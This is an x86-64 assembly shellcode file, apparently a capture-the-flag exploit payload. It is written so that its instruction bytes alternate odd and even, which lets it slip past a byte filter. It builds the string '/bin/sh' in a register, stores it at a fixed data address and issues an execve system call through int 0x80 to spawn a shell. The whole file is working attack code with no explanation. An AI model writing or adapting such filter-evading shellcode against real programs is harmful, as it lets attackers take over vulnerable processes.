; assemble payload.asm to payload.bin: nasm -f bin payload.asm -o payload.bin
[BITS 64]
;data section: 0x404050
;int 0x80  ; odd even
;mov al, # ; even #
;push rax  ; even
;pop rbx   ; odd
;pop rdx   ; even
;pop rcx   ; odd
;nop       ; even
;wait      ; odd
;shl eax, 1; odd even
;mov ah, # ; even #
;push #    ; even #
;pop rax   ; even
;shr bl, 1 ; even odd
;mov qword [rdx], rax ; even odd even
;push rbx  ; odd
;shl rax, 1; even odd even
;or ax, bx ; even odd even
;shl edx, 1; odd even
;mov dl, # ; even #
;push rdx  ; even
;mov bl, # ; odd even

mov dl, 0x01          ; even odd
nop                   ; even

shl edx, 1            ; odd even
shl edx, 1            ; odd even
shl edx, 1            ; odd even
shl edx, 1            ; odd even
shl edx, 1            ; odd even
shl edx, 1            ; odd even
shl edx, 1            ; odd even
shl edx, 1            ; odd even
; rdx = 01 00

wait                  ; odd
mov dl, 0x01          ; even odd
; rdx = 01 01

nop                   ; even
shl edx, 1            ; odd even
shl edx, 1            ; odd even
shl edx, 1            ; odd even
shl edx, 1            ; odd even
shl edx, 1            ; odd even
shl edx, 1            ; odd even
; rdx = 40 40

shl edx, 1            ; odd even
shl edx, 1            ; odd even
shl edx, 1            ; odd even
shl edx, 1            ; odd even
shl edx, 1            ; odd even
shl edx, 1            ; odd even
shl edx, 1            ; odd even
shl edx, 1            ; odd even
; rdx = 40 40 00

wait                  ; odd
mov dl, 0x51          ; even odd
; rdx = 40 40 51

push rax              ; even
pop rbx               ; odd
nop                   ; even
mov bl, 0x68          ; odd even
wait                  ; odd
or ax, bx             ; even odd even
; rax = 68

shl eax, 1            ; odd even
shl eax, 1            ; odd even
shl eax, 1            ; odd even
shl eax, 1            ; odd even
shl eax, 1            ; odd even
shl eax, 1            ; odd even
shl eax, 1            ; odd even
shl eax, 1            ; odd even
; rax = 68 00

wait                  ; odd
mov al, 0x73          ; even odd
; rax = 68 73

nop                   ; even
shl eax, 1            ; odd even
shl eax, 1            ; odd even
shl eax, 1            ; odd even
shl eax, 1            ; odd even
shl eax, 1            ; odd even
shl eax, 1            ; odd even
shl eax, 1            ; odd even
shl eax, 1            ; odd even
; rax = 68 73 00

wait                  ; odd
mov al, 0x2f          ; even odd
; rax = 68 73 2f

nop                   ; even
shl eax, 1            ; odd even
shl eax, 1            ; odd even
shl eax, 1            ; odd even
shl eax, 1            ; odd even
shl eax, 1            ; odd even
shl eax, 1            ; odd even
shl eax, 1            ; odd even
shl eax, 1            ; odd even
; rax = 68 73 2f 00

mov bl, 0x6e          ; odd even
wait                  ; odd
or ax, bx             ; even odd even
; rax = 68 73 2f 6e

wait                  ; odd
shl rax, 1            ; even odd even
wait                  ; odd
shl rax, 1            ; even odd even
wait                  ; odd
shl rax, 1            ; even odd even
wait                  ; odd
shl rax, 1            ; even odd even
wait                  ; odd
shl rax, 1            ; even odd even
wait                  ; odd
shl rax, 1            ; even odd even
wait                  ; odd
shl rax, 1            ; even odd even
wait                  ; odd
shl rax, 1            ; even odd even
wait                  ; odd
; rax = 68 73 2f 6e 00

mov al, 0x69          ; even odd
; rax = 68 73 2f 6e 69

shl rax, 1            ; even odd even
wait                  ; odd
shl rax, 1            ; even odd even
wait                  ; odd
shl rax, 1            ; even odd even
wait                  ; odd
shl rax, 1            ; even odd even
wait                  ; odd
shl rax, 1            ; even odd even
wait                  ; odd
shl rax, 1            ; even odd even
wait                  ; odd
shl rax, 1            ; even odd even
wait                  ; odd
shl rax, 1            ; even odd even
; rax = 68 73 2f 6e 69 00

mov bl, 0x62          ; odd even
wait                  ; odd
or ax, bx             ; even odd even
; rax = 68 73 2f 6e 69 62

wait                  ; odd
shl rax, 1            ; even odd even
wait                  ; odd
shl rax, 1            ; even odd even
wait                  ; odd
shl rax, 1            ; even odd even
wait                  ; odd
shl rax, 1            ; even odd even
wait                  ; odd
shl rax, 1            ; even odd even
wait                  ; odd
shl rax, 1            ; even odd even
wait                  ; odd
shl rax, 1            ; even odd even
wait                  ; odd
shl rax, 1            ; even odd even
wait                  ; odd
; rax = 68 73 2f 6e 69 62 00

mov al, 0x2f          ; even odd
; rax = 68 73 2f 6e 69 62 2f

mov qword [rdx], rax  ; even odd even

mov bl, 0             ; odd even
push rbx              ; odd
nop                   ; even
push rbx              ; odd
nop                   ; even
push rbx              ; odd
pop rax               ; even
wait                  ; odd
mov al, 0x0b          ; even odd

push rdx              ; even
pop rbx               ; odd

pop rdx               ; even
pop rcx               ; odd
nop                   ; even
int 0x80              ; odd even
wait                  ; odd
db 0x0a               ; even